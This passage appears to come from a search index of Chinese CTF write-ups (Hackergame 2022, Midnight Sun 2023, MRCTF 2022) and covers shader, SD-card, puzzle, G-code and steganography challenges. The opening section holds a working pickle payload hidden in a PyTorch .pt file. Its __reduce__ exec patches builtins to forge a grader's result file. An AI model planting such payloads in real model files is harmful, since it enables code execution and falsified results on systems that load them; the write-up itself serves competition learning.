\u8fd9\u4e2a\u5728\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\u8fd0\u884c infer.py \u53ef\u4ee5\u6253\u901a\uff0c\u4f46\u8fdc\u7a0b\u5c31\u4e0d\u53ef\u4ee5\u3002\u6240\u4ee5\u53ef\u4ee5\u731c\u6d4b\u8fdc\u7a0b\u5b9e\u9645\u4e0a\u4ece\u5176\u5b83\u6a21\u5757\u4e2d\u8c03\u7528\u4e86 infer \u51fd\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u5e38\u8fd4\u56de\uff0c\u5219\u4f1a\u62a5\u9519\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff0c\u53ea\u662f\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002\u6839\u636e\u6e90\u7801\u53ef\u4ee5\u77e5\u9053\u6700\u7ec8\u4f1a\u5c06\u6a21\u578b\u8f93\u51fa\u7684\u7ed3\u679c\u5b58\u653e\u5728 /tmp/result.json \u4e2d\uff0c\u7136\u540e\u5728\u5176\u5b83\u4f4d\u7f6e\u518d\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\uff0c\u8fdb\u884c\u5224\u65ad\u3002\u800c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u5219\u4f1a\u76f4\u63a5\u62a5\u9519\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5728 reduce \u4e2d\u5c06\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\u5148\u5199\u5165 /tmp/result.json \u4e2d\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u76f4\u63a5 exit\uff0c\u5219\u540e\u9762\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\uff0c\u4f1a\u51fa\u73b0\u62a5\u9519\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba9\u540e\u9762\u5b8c\u5168\u6b63\u5e38\u8fd0\u884c\u3002\u6574\u4e2a infer \u51fd\u6570\u7684\u903b\u8f91\u5927\u6982\u5982\u4e0b\uff1a <pre><code>def infer(pt_file):\n    # ...\n    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)\n    model.load_state_dict(torch.load(pt_file, map_location=\"cpu\"))\n\n    # ... predict\n\n    json.dump({\"gen_imgs_b64\": gen_imgs}, open(\"/tmp/result.json\", \"w\"))\n</code></pre> \u6211\u4eec\u8f93\u5165\u7684 pt \u6587\u4ef6\u4f1a\u5728 torch.load \u4e2d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u65f6\u4f1a\u5199\u5165 /tmp/result.json\u3002\u800c\u540e\u9762\u5bf9\u4e8e\u6211\u4eec\u5199\u5165\u7684\u5a01\u80c1\u5c31\u662f\u8fd8\u4f1a json.dump \u4e00\u6b21\u3002\u6240\u4ee5\u9996\u5148\u9700\u8981\u5c06 json.dump \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u62b9\u9664\u6389\uff1a<code>__import__('json').dump=lambda x, y: 0</code>\u3002\u4f46\u8fd9\u8fd8\u4e0d\u591f\uff0c\u56e0\u4e3a\u53c2\u6570\u4e2d\u7684 open \u4e5f\u4f1a\u6267\u884c\uff0c\u4ee5 w \u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u7684\u8bdd\u4f1a\u5148\u76f4\u63a5\u6e05\u7a7a\u6587\u4ef6\uff0c\u6240\u4ee5\u4e5f\u9700\u8981\u62b9\u6389 open \u7684\u4f5c\u7528\u3002\u4e0d\u8fc7\u540e\u9762\u80af\u5b9a\u8fd8\u4f1a\u9700\u8981\u4f7f\u7528 open \u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u80fd\u62b9\u6389\u5199\u5165\u7684\u90e8\u5206\uff1a<code>__builtins__['_open'] = open; __builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)</code>\u3002</p> <p>\u8fd9\u6837\u6765\u8bb2\u6211\u4eec\u7684 exp \u5c31\u662f\uff1a <pre><code>class Exploit(object):\n    def __reduce__(self):\n        text = '{\"gen_imgs_b64\": [\"......'\n        return (exec, (f\"open('/tmp/result.json', 'w').write('{text}');\"\n            \"__import__('json').dump=lambda x, y: 0;\"\n            \"__builtins__['_open']=open;\"\n            \"__builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)\", ))\n</code></pre></p> <p>\u4f46\u4ec5\u5c06\u8fd9\u4e2a\u6253\u5305\u540e\u5f97\u5230\u7684 data.pkl \u76f4\u63a5\u538b\u7f29\u8fdb pt \u6587\u4ef6\u8fd8\u662f\u4e0d\u884c\u3002\u56e0\u4e3a\u6a21\u578b\u5c31\u6ca1\u6cd5\u6b63\u5e38\u8bfb\u53d6\u4e86\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\u3002</p> <p>pkl \u6587\u4ef6\u5b9e\u9645\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684\u865a\u62df\u673a\u6307\u4ee4\uff0cpickle \u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u6267\u884c\u5b83\u3002\u770b\u6e90\u7801\u53ef\u4ee5\u4e86\u89e3\u5230\u6709\u4e00\u4e2a\u6307\u4ee4 0x2E \u8868\u793a\u4e86\u7ed3\u675f\u8fd4\u56de\u3002\u6240\u4ee5\u76f4\u63a5\u5c06\u751f\u6210\u7684 data.pkl \u672b\u5c3e\u7684 0x2E \u53bb\u6389\uff0c\u7136\u540e\u76f4\u63a5\u63a5\u4e0a\u4e00\u4efd\u6b63\u786e\u7684 data.pkl \u5185\u5bb9\u5373\u53ef\u5b8c\u6210\u6784\u9020\u3002</p> <p>\u6784\u9020\u597d\u540e\u4e0a\u4f20 pt \u6587\u4ef6\uff0c\u5373\u53ef\u8fbe\u5230\u76ee\u6807\u5f97\u5230 flag\uff1aflag{Torch.Load.Is.Dangerous-\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#_14","title":"\u5149\u4e0e\u5f71","text":"<p>\u5192\u9669\uff0c\u5c31\u8981\u4e0d\u65ad\u5411\u524d\uff01</p> <p>\u5728\u5bc2\u9759\u7684\u795e\u79d8\u661f\u7403\u4e0a\uff0c\u7ee7\u7eed\u524d\u8fdb\uff0c\u63a2\u5bfb flag \u7684\u5965\u79d8\u5427\uff01</p> <p>\u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a WebGL \u6e32\u67d3\u7684\u573a\u666f\uff0c\u5176\u4e2d flag \u7684\u5185\u5bb9\u88ab\u6321\u4f4f\u4e86\u3002\u6240\u6709\u5185\u5bb9\u90fd\u662f\u5728\u524d\u7aef\u7684\uff0c\u5b58\u4e0b\u6765\u5c31\u53ef\u4ee5\u672c\u5730\u8c03\u8bd5\u3002</p> <p>\u53d1\u73b0\u5176\u4e2d\u7684\u4e3b\u8981\u573a\u666f\u6e32\u67d3\u4ee3\u7801\u90fd\u5728 fragment-shader.js \u4e2d\u3002\u53ef\u4ee5\u53d1\u73b0\u7531\u4e00\u4e9b sdf \u7ec4\u6210\uff0c\u6700\u7ec8\u7684\u573a\u666f\u4e5f\u662f\u7531\u51e0\u4e2a sdf \u7ed3\u679c\u53d6 min \u800c\u6765\u7684\u3002</p> <p>\u770b\u8d77\u6765 t5SDF \u7684\u4ee3\u7801\u6700\u77ed\uff0c\u53ef\u80fd\u662f\u65bd\u52a0\u7684\u906e\u76d6\u3002\u6240\u4ee5\u5c06 sceneSDF \u4e2d t5 \u76f8\u5173\u7684\u90e8\u5206\u5220\u6389\uff0c\u518d\u6253\u5f00\u9875\u9762\u8fd0\u884c\u5373\u53ef\u770b\u5230\u5b8c\u6574 flag\uff1aflag{SDF-i3-FuN!}</p> <p></p>"},{"location":"writeups/hackergame2022/#_15","title":"\u7247\u4e0a\u7cfb\u7edf","text":"<p>\u6700\u8fd1\uff0c\u4f60\u542c\u8bf4\u5ba4\u53cb\u5728 SD \u5361\u65b9\u9762\u53d6\u5f97\u4e86\u4e9b\u8fdb\u5c55\u3002\u5728\u4ed6\u65e5\u590d\u4e00\u65e5\u7684\u81ea\u8a00\u81ea\u8bed\u4e2d\uff0c\u4f60\u9010\u6e10\u4e86\u89e3\u5230\u8fd9\u4e2a\u7531\u4ed6\u4e00\u4e2a\u4eba\u81ea\u4e3b\u7814\u53d1\u7684\u7247\u4e0a\u7cfb\u7edf\u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u4ece SD \u5361\u542f\u52a8\uff1a\u5148\u7531\u201c\u7247\u4e0a ROM \u4e2d\u7684\u56fa\u4ef6\u201d\u52a0\u8f7d\u5e76\u8fd0\u884c SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u4e2d\u7684\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\uff0c\u4e4b\u540e\u7531\u8fd9\u4e2a\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\u4ece SD \u5361\u4e2d\u52a0\u8f7d\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u3002\u800c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u76ee\u524d\u80fd\u505a\u7684\u53ea\u662f\u5411\u201c\u4e32\u53e3\u201d\u8f93\u51fa\u4e00\u4e9b\u5b57\u7b26\u3002</p> <p>\u540c\u65f6\u4f60\u542c\u8bf4\uff0c\u8fd9\u4e2a\u5e76\u4e0d\u5b8c\u5584\u7684 SD \u5361\u9a71\u52a8\u53ea\u4f7f\u7528\u4e86 SD \u5361\u7684 SPI \u6a21\u5f0f\uff0c\u800c\u4f20\u8f93\u901f\u5ea6\u4e5f\u662f\u4f4e\u5f97\u611f\u4eba\u3002\u6b64\u65f6\u4f60\u7a81\u7136\u60f3\u5230\uff1a\u5982\u679c\u901f\u5ea6\u4e0d\u5feb\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u903b\u8f91\u5206\u6790\u4eea\u6765\u91c7\u96c6\uff08\u5077\u7a83\uff09\u8fd9\u4e2a SD \u5361\u7684\u4fe1\u53f7\uff0c\u4ece\u800c\u201c\u83b7\u5f97\u201d SD \u5361\u4ee5\u81f3\u4e8e\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u7684\u79d8\u5bc6\uff1f</p> <p>\u4f60\u4ece\u62bd\u5c49\u89d2\u843d\u638f\u51fa\u5403\u7070\u5df2\u4e45\u7684\u903b\u8f91\u5206\u6790\u4eea\u3002\u8fd9\u4e2a\u5c0f\u4e1c\u897f\u4ef7\u683c\u4e0d\u5230 50 \u5757\u94b1\uff0c\u91c7\u6837\u7387\u4e5f\u53ea\u6709 24 M\u3002\u4f60\u6253\u5f00 PulseView\uff0c\u628a\u91c7\u6837\u7387\u8c03\u9ad8\uff0c\u8fde\u4e0a\u5ba4\u53cb\u5f00\u53d1\u677f\u4e0a SD \u5361\u7684\u5f15\u811a\uff0c\u7136\u540e\u63a5\u901a\u4e86\u5f00\u53d1\u677f\u7684\u7535\u6e90\uff0c\u5e0c\u671b\u8fd9\u804a\u80dc\u4e8e\u65e0\u7684\u5206\u6790\u4eea\u771f\u7684\u80fd\u6293\u5230\u70b9\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4fe1\u53f7\u3002\u81f3\u4e8e\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u76f4\u63a5\u628a SD \u5361\u62ff\u4e0b\u6765\u8bfb\u53d6\u6570\u636e\uff0c\u5c31\u6ca1\u4eba\u77e5\u9053\u4e86\u3002</p> <p>\u5f15\u5bfc\u6247\u533a</p> <p>\u542c\u8bf4\uff0c\u7b2c\u4e00\u4e2a flag \u85cf\u5728 SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u7684\u672b\u5c3e\u3002\u4f60\u80fd\u627e\u5230\u5b83\u5417\uff1f</p> <p>\u64cd\u4f5c\u7cfb\u7edf</p> <p>\u5ba4\u53cb\u7684\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u4f1a\u8f93\u51fa\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u548c\u7b2c\u4e8c\u4e2a flag\u3002\u4ece\u5ba4\u53cb\u524d\u4e9b\u65e5\u5b50\u793e\u4ea4\u7f51\u7edc\u53d1\u5e03\u7684\u7ec8\u7aef\u622a\u56fe\u770b\uff0c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u6bcf\u6b21\u201c\u542f\u52a8\u201d\u90fd\u4f1a\u9996\u5148\u8f93\u51fa\uff1a</p> <p>LED: ON Memory: OK</p> <p>\u6216\u8bb8\u4f60\u53ef\u4ee5\u6839\u636e\u8fd9\u4e00\u90e8\u5206\u56fa\u5b9a\u7684\u8f93\u51fa\u548c\u5f15\u5bfc\u6247\u533a\u7684\u4ee3\u7801\uff0c\u5148\u641e\u6e05\u695a\u90a3\u201c\u4e32\u53e3\u201d\u548c\u201cSD \u5361\u9a71\u52a8\u201d\u5230\u5e95\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u4e4b\u540e\u518d\u4ed4\u7ec6\u7814\u7a76 flag \u5230\u5e95\u662f\u4ec0\u4e48\uff0c\u5c31\u50cf\u5f53\u5e74\u7684 Enigma \u4e00\u6837\u3002</p> <p>\u7b2c\u4e00\u90e8\u5206\u76f4\u63a5\u4f7f\u7528 PulseView \u8f6f\u4ef6\u8bfb\u53d6 binary \u6587\u4ef6\uff0c\u5f97\u5230\u4fe1\u53f7\uff0c\u7136\u540e\u6dfb\u52a0 SD card\uff08SPI mode\uff09\u89e3\u7801\u5668\uff0c\u5c06\u51e0\u4e2a\u4fe1\u53f7\u63a5\u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 MOSI data \u4e2d\u770b\u5230 flag</p> <p></p> <p>dump \u51fa\u6765\u7136\u540e\u8f6c\u6362\u5373\u53ef\u5f97\u5230 flag\uff1aflag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8bd5\u56fe\u9006\u5411\u540e\u9762\u7684 RISCV \u6307\u4ee4\uff0c\u4f46\u5b8c\u5168\u770b\u4e0d\u51fa\u4ec0\u4e48\u6709\u610f\u4e49\u7684\u4e1c\u897f\uff0c\u6000\u7591\u662f\u6570\u636e\u641e\u9519\u4e86\uff0c\u61d2\u5f97\u4fee\uff0c\u7f62\u4e86\u3002</p>"},{"location":"writeups/hackergame2022/#_16","title":"\u4f01\u9e45\u62fc\u76d8","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u53ef\u7231\u7684\u4f01\u9e45\u6ed1\u5757\u62fc\u76d8\u3002\uff08\u89c9\u5f97\u4e0d\u53ef\u7231\u7684\u540c\u5b66\u53ef\u4ee5\u6362\u53ef\u7231\u7684\u9898\u505a\uff09</p> <p>\u548c\u5e02\u9762\u4e0a\u53ea\u80fd\u6253\u4e71\u4e4b\u540e\u62fc\u56de\u7684\u666e\u901a\u6ed1\u5757\u62fc\u76d8\u4e0d\u540c\uff0c\u8fd9\u4e2a\u62fc\u76d8\u662f\u81ea\u52a8\u6253\u4e71\u62fc\u56de\u7684\u3002\u4e00\u6b21\u6e38\u620f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4f53\u9a8c\u5230 16/256/4096 \u6b21\u666e\u901a\u62fc\u76d8\u7684\u4e50\u8da3\u3002</p> <p>\u6bcf\u4e00\u6b65\u7684\u6253\u4e71\u7684\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u9009\u62e9\u54ea\u4e00\u79cd\u5219\u7531\u60a8\u7684\u8f93\u5165\uff08\u957f\u5ea6\u4e3a 4/16/64 \u7684 0/1 \u5e8f\u5217\uff09\u7684\u67d0\u4e00\u4f4d\u51b3\u5b9a\u3002\u5982\u679c\u60a8\u5728\u6700\u540e\u80fd\u6210\u529f\u6253\u4e71\u8fd9\u4e2a\u62fc\u76d8\uff0c\u60a8\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 flag \u5566\uff0c\u5feb\u6765\u8bd5\u8bd5\u5427wwwwww</p> <p>\u7b2c\u4e00\u90e8\u5206\u8f93\u5165\u53ea\u6709\u56db\u4e2a bit\uff0c\u76f4\u63a5\u624b\u52a8\u8bd5\u5c31\u80fd\u8bd5\u51fa\u6765\u7b54\u6848\u662f 1000\uff0cflag\uff1aflag{it_works_like_magic_\u2026\u2026}</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8f93\u5165\u6709 16 \u4e2a bit\uff0c\u53ef\u4ee5\u7528\u4ee3\u7801\u7206\u7834\u4e00\u4e0b\uff0c\u5c06\u9898\u7ed9\u4ee3\u7801\u4e2d\u7684\u4e3b\u903b\u8f91\u590d\u5236\u51fa\u6765\uff0c\u679a\u4e3e\u8f93\u5165\u8dd1\u4e00\u4e0b\uff1a <pre><code>import json\nfrom tqdm import tqdm\nfrom sys import argv\n\nclass Board:\n    def __init__(self):\n        self.b = [[i*4+j for j in range(4)] for i in range(4)]\n\n    def _blkpos(self):\n        for i in range(4):\n            for j in range(4):\n                if self.b[i][j] == 15:\n                    return (i, j)\n\n    def reset(self):\n        for i in range(4):\n            for j in range(4):\n                self.b[i][j] = i*4 + j\n\n    def move(self, moves):\n        for m in moves:\n            i, j = self._blkpos()\n            if m == 'L':\n                self.b[i][j] = self.b[i][j-1]\n                self.b[i][j-1] = 15\n            elif m == 'R':\n                self.b[i][j] = self.b[i][j+1]\n                self.b[i][j+1] = 15\n            elif m == 'U':\n                self.b[i][j] = self.b[i-1][j]\n                self.b[i-1][j] = 15\n            else:\n                self.b[i][j] = self.b[i+1][j]\n                self.b[i+1][j] = 15\n\n    def __bool__(self):\n        for i in range(4):\n            for j in range(4):\n                if self.b[i][j] != i*4 + j:\n                    return True\n        return False\n\nwith open(\"chals/b16_obf.json\") as f:\n    branches = json.load(f)\n\nb = Board()\nstart = ...\nend = ...\nfor i in tqdm(range(start, end)):\n    b.reset()\n    bits = bin(i)[2:].zfill(16)\n    for branch in branches:\n        b.move(branch[1] if bits[branch[0]] == '1' else branch[2])\n    if b:\n        print(bits)\n        break\n</code></pre> \u7206\u7834\u51fa\u7ed3\u679c\u4e3a 0010111110000110\uff0cflag\uff1aflag{Branching_Programs_are_NC1_\u2026\u2026}</p> <p>\u7b2c\u4e09\u90e8\u5206\u592a\u590d\u6742\u4e86\uff0c\u5e94\u8be5\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u6bd5\u7adf\u8fd9\u662f\u4e00\u9053 math \u9898\uff0c\u5f00\u6446\u3002</p>"},{"location":"writeups/hackergame2022/#e","title":"\u706b\u773c\u91d1\u775b\u7684\u5c0f E","text":"<p>\u5c0f E \u6709\u5f88\u591a\u7684 ELF \u6587\u4ef6\uff0c\u5b83\u4eec\u91cc\u9762\u7684\u51fd\u6570\u6709\u70b9\u50cf\uff0c\u80fd\u628a\u5b83\u4eec\u5339\u914d\u8d77\u6765\u5417\uff1f</p> <p>\u5c0f A\uff1a\u8fd9\u4e0d\u662f\u7528 BinDiff \u5c31\u53ef\u4ee5\u4e86\u5417\uff0c\u5f88\u7b80\u5355\u5427\uff1f</p> <p>\u53ea\u505a\u4e86\u53f3\u624b\u5c31\u884c\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u4e24\u6b21\u8fbe\u5230 100% \u6b63\u786e\u3002\u62d6\u8fdb IDA \u4e2d\u786c\u770b\uff0c\u627e CFG \u56fe\u4ee5\u53ca\u6c47\u7f16\u4ee3\u7801\u6bd4\u8f83\u7c7b\u4f3c\u7684\u51fd\u6570\u5373\u53ef\uff0c\u65f6\u9650\u4e5f\u5f88\u957f\uff0c\u4e0d\u7528\u7740\u6025\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u627e\u5230\u76f8\u4f3c\u7684\u51fd\u6570\u3002\u63d0\u4ea4\u62ff\u5230 flag\uff1aflag{easy_to_use_bindiff_\u2026\u2026} \uff08\u7b11\u6b7b\uff0c\u6839\u672c\u6ca1\u7528 bindiff\uff09</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8981\u6c42\u4e00\u4e2a\u5c0f\u65f6\u5185\u5b8c\u6210 100 \u9898\u4e2d\u7684 40 \u9898\uff0c\u7b2c\u4e09\u90e8\u5206\u8981\u6c42\u4e09\u5c0f\u65f6\u5185\u5b8c\u6210 200 \u9898\u4e2d\u7684 60 \u9898\uff0c\u4e0d\u60f3\u505a\uff0c\u5f00\u6446\u3002</p>"},{"location":"writeups/midnight2023/","title":"Midnight Sun CTF 2023 Quals Writeup","text":"<p> \u7ea6 148 \u4e2a\u5b57  20 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u6bd4\u8d5b\u533a\u5206\u5ea6\u5f88\u5c0f\uff0c\u53ea\u5dee\u4e00\u9053\u9898 AK \u4f46\u62cd\u4e86\u7b2c\u5341\u6ca1\u8fdb\u51b3\u8d5b\u3002</p> <p>\u505a\u4e86\u51e0\u4e2a misc \u8fd8\u53ef\u4ee5\u3002</p>"},{"location":"writeups/midnight2023/#whistle","title":"whistle","text":"<p>\u4e00\u4e2a\u86ee\u5927\u7684\u6587\u4ef6\uff0c\u5185\u5bb9\u5f00\u5934\uff1a</p> <pre><code>G00 S1;\nG00 E0;\nG01 S1;\nG01 E0;\nG21;\nG91 G0 F300.0 Z20.000;\nG90;\nG28 X;\nG28 Y;\nG28 Z;\nG00 F300.0 Z35.000;\nG00 F2400.0 Y0.000;\nG00 F2400.0 X0.000;\nG00 F2400.0 X170.045 Y109.968;\nG00 F300.0 Z15.000;\nG01 F2100.0 X169.464 Y109.947;\nG01 F2100.0 X169.158 Y109.883;\nG01 F2100.0 X168.900 Y109.777;\nG01 F2100.0 X168.692 Y109.628;\nG01 F2100.0 X168.530 Y109.444;\n</code></pre> <p>\u8fd8\u633a\u6709\u7279\u5f81\uff0c\u641c\u4e00\u4e0b\u662f\u6570\u63a7\u7f16\u7a0b\u7684 G-code\uff0c\u624b\u5199\u4e0d\u592a\u73b0\u5b9e\uff0c\u53ef\u4ee5\u641c\u5230 simulator: https://ncviewer.com/\uff0c\u8dd1\u4e00\u4e0b\uff1a</p> <p></p> <p>\u6709\u5f88\u591a redacted\uff0c\u5e94\u8be5\u662f\u65e0\u7528\u4fe1\u606f\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e9b _? \u7b49\u5b57\u7b26\u5e94\u8be5\u662f flag\uff0c\u52a8\u6001\u7ed8\u5236\u4e00\u4e0b\uff0c\u9664\u6389 redacted \u76f8\u5173\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u5f97\u5230\u5e72\u5e72\u51c0\u51c0\u7684\uff1a</p> <p></p> <p>flag: midnight{router_hacking?}</p> <p>\u8fd8\u6709\u4e24\u9053\u6211\u90fd\u53ea\u53c2\u4e0e\u4e86\u4e00\u90e8\u5206\uff0c\u8fd8\u662f\u4e0d\u5199\u4e86\uff08</p>"},{"location":"writeups/mrctf2022/","title":"MRCTF 2022 Writeup","text":"<p> \u7ea6 928 \u4e2a\u5b57  424 \u884c\u4ee3\u7801  18 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 </p> <p>misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee</p>"},{"location":"writeups/mrctf2022/#readlongnovel","title":"ReadLongNovel","text":"<p>\u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a</p> <p>flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65}</p>"},{"location":"writeups/mrctf2022/#connecting","title":"Connecting...","text":"<p>obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09</p> <p>\u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c</p> <p></p> <pre><code>&gt;&gt;&gt; for each in [0x4d, 0x33, 0x52, 0x37, 0x61, 0x49, 0x63, 0x54, 0x46]:\n...     print(chr(each), end=\"\")\n...\nM3R7aIcTF\n</code></pre> <p>\u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work.</p> <p>\u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 <code>M3R7aIcTF</code> \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a</p> <pre><code>FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I\n</code></pre> <p>base32\uff1a <code>(M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!}</code></p> <p>flag: MRCTF{WIFI_2022_connect_successfully!}</p>"},{"location":"writeups/mrctf2022/#pixel","title":"Pixel","text":"<p>blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09</p> <p></p> <p>\u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a</p> <pre><code>img2 = Image.new(\"RGB\", (512, 512))\nfor i in range(512):\n    for j in range(512):\n        img2.putpixel((i, j), (255, 255, 255))\nfor n in tqdm(range(512)):\n    img = Image.open(f\"pixel/{n}.png\")\n    width, height = img.size\n    for i in range(width):\n        for j in range(height):\n            R, G, B = pix = img.getpixel((i, j))\n            if B != 255:\n                img2.putpixel((i,j), pix)\nimg2.save(f\"zigzag.png\")\n</code></pre> <p></p> <p>red plane 0 \u6709\u95ee\u9898</p> <p></p> <p>\u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539</p> zigzag <pre><code>from PIL import Image\nimport numpy as np\n\ndef zigzag(data):\n    row = data.shape[0]\n    col = data.shape[1]\n    num = row * col\n    lst = np.zeros(num,)\n    k = 0\n    i = 0\n    j = 0\n\n    while i &lt; row and j &lt; col and k &lt; num:\n        lst[k] = data.item(i, j)\n        k = k + 1\n        if (i + j) % 2 == 0:\n            if (i-1) in range(row) and (j+1) not in range(col):\n                i = i + 1\n            elif (i-1) not in range(row) and (j+1) in range(col):\n                j = j + 1\n            elif (i-1) not in range(row) and (j+1) not in range(col):\n                i = i + 1\n            else:\n                i = i - 1\n                j = j + 1\n        elif (i + j) % 2 == 1:\n            if (i+1) in range(row) and (j-1) not in range(col):\n                i = i + 1\n            elif (i+1) not in range(row) and (j-1) in range(col):\n                j = j + 1\n            elif (i+1) not in range(row) and (j-1) not in range(col):\n                j = j + 1\n            else:\n                i = i + 1\n                j = j - 1\n    return lst\n\ndef dezigzag(data):\n    num = len(data)\n    row = int(num ** 0.5)\n    col = int(num ** 0.5)\n    lst = np.zeros((row, col))\n    k = 0\n    i = 0\n    j = 0\n\n    while i &lt; row and j &lt; col and k &lt; num:\n        lst[i][j] = data[k]\n        k = k + 1\n        if (i + j) % 2 == 0:\n            if (i-1) in range(row) and (j+1) not in range(col):\n                i = i + 1\n            elif (i-1) not in range(row) and (j+1) in range(col):\n                j = j + 1\n            elif (i-1) not in range(row) and (j+1) not in range(col):\n                i = i + 1\n            else:\n                i = i - 1\n                j = j + 1\n        elif (i + j) % 2 == 1:\n            if (i+1) in range(row) and (j-1) not in range(col):\n                i = i + 1\n            elif (i+1) not in range(row) and (j-1) in range(col):\n                j = j + 1\n            elif (i+1) not in range(row) and (j-1) not in range(col):\n                j = j + 1\n            else:\n                i = i + 1\n                j = j - 1\n    return lst\n\ndef 